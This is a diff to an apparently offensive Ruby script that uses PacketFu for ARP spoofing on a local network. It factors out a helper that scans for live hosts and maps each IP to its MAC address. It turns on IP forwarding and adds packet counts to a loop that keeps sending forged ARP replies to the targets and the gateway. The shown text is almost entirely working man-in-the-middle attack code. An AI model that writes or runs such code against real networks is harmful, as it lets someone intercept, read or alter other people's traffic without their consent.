@@ -84,6 +84,22 @@ def build_pkt(op_code, dest_mac, source_ip, dest_ip)
   @arp_pkt.arp_saddr_ip = source_ip
   @arp_pkt.arp_daddr_ip = dest_ip
 end 
+
+def target_scanner(targets, timeout)
+  puts_verbose("Looking for live targets...")
+  targets.each do |ip|
+    #Thread.new(ip) do |ip|
+    target_mac = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
+    @targets_hash[ip] = target_mac                  # Make hash of target ips => target macs
+    #end
+    if target_mac
+      puts_verbose "#{ip}: mac is #{target_mac}"
+    else
+      puts_verbose "#{ip}: is down, can't spoof"
+    end
+  end
+  @targets_hash.delete_if { |k, v| v.nil? }
+end
   
 #----------------------------------------------------------------------#
 # Let's set some defaults and variables
@@ -192,28 +208,13 @@ if broadcast
   @target_packets << @arp_pkt
   if @two_way
     target_parse("#{(@defaults[:ip4_obj]).to_s}-255") # Make hash of network ip's, range 0-255
-    @target.each do |ip|
-      #Thread.new(ip) do |ip|
-      target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
-      @targets_hash[ip] = target_mac                  # Make hash of target ips => target macs
-      #end
-    end
-    @targets_hash.delete_if { |k, v| v.nil? }
+    target_scanner(@target, 1.5)
     @targets_hash.delete(@gateway)
   end
 else  
   target_parse(target)
-  @target.each do |ip|
-    target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
-    @targets_hash[ip] = target_mac     
-    if target_mac
-      puts_verbose "#{ip}: mac is #{target_mac}"
-    else
-      puts_verbose "#{ip}: is down, can't spoof"
-    end
-  end
-  @targets_hash.delete_if { |k, v| v.nil? }
-  end ### need to tell self real gateway?
+  target_scanner(@target, 2)
+end ### need to tell self real gateway?
 
 # Make arrays of packets for targets and gateway
 # Args for build_pkt are: op_code, dest_mac, source_ip, dest_ip
@@ -226,23 +227,29 @@ end
 if @two_way
   @targets_hash.each do |target, |
     build_pkt(2, @gateway_mac, target, @gateway)
-    @gateway_packets  << @arp_pkt
+    @gateway_packets << @arp_pkt
   end
 end
     
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 send_packets = true
 while send_packets
+  puts "Sending spoofing packets..."
+  print "Packets sent: " if @verbose
+  count = 0
   while true
     @target_packets.each do |pkt|
       pkt.to_w(@iface)
+      count += 1
     end
     if @two_way
       @gateway_packets.each do |pkt|
         pkt.to_w(@iface)
+        count += 1
       end
     end
     GC.start   # to deal with "memory leak" (more likely a problem calling GC)
+    print "#{count}; " if @verbose
     sleep 2
   end
 end
